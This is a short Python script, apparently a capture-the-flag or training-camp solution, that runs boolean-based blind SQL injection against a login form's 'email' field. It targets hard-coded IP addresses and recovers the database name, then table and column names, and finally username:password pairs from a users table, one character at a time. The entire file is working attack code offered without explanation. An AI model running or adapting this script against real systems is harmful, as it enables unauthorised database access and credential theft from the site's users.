import requests


def x():
    for i in range(1, 25):
        for j in range(1, 128):
            postData = "olmayanbirveri1221' or ascii(substring(database()," + str(i) + ",1))=" + str(j) + " -- -"
            r = requests.post('http://35.226.202.199/', data={"email": postData})
            if 'sistemimize' in r.text:
                print(chr(j))
                break


def y():
    for i in range(1, 200):
        for j in range(1, 127):
            postData = "olmayanbirveri12121313' union select group_concat(table_name) as x from information_schema.tables where table_schema = 'busiber_kis_kampi_2020' having ascii(substring(x," + str(
                i) + ",1))= " + str(j) + " -- - "
            r = requests.post("http://192.168.43.230", data={"email": postData})
            if 'sistemimize' in r.text:
                print(chr(j))
                break


def z():
    for i in range(1, 110):
        for j in range(1, 127):
            postData = "olmayanbirveri12121313' union select group_concat(column_name) as x from information_schema.columns where table_schema = 'busiber_kis_kampi_2020' having ascii(substring(x," + str(
                i) + ",1))= " + str(j) + " -- - "
            r = requests.post("http://192.168.43.230", data={"email": postData})
            if 'sistemimize' in r.text:                                                                                                                                                                                                    
                print(chr(j))                                                                                                                                                                                                      
                break                                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
def a():                                                                                                                                                                                                                                   
    for i in range(1, 25):                                                                                                                                                                                                                 
        for j in range(1, 127):                                                                                                                                                                                                            
            postData = "olmayanbirveri12121313' union select group_concat(username,':',password) as x from users having ascii(substring(x," + str(                                                                                         
                i) + ",1))=" + str(j) + " -- -"                                                                                                                                                                                            
            r = requests.post("http://192.168.1.101/", data={"email": postData})                                                                                                                                                           
            if 'sistemimize' in r.text:                                                                                                                                                                                                    
                print(chr(j))                                                                                                                                                                                                      
                break                                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
x() 
